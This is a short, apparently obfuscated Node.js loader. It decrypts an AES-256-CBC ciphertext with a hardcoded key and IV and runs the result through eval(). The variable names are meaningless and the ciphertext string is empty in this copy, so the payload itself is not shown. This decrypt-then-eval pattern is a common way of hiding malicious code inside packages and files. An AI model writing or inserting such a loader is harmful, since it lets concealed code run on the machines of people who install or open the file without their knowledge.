const ito = require('crypto');
const itinho = Buffer.from('928922e543f5c367dcc48a58c529f89d09e124fcbe4e2c8a6cbfcb01b81233ec', 'hex');
const octua = Buffer.from('e9e06a1ec3663d8318578fcf19d35812', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
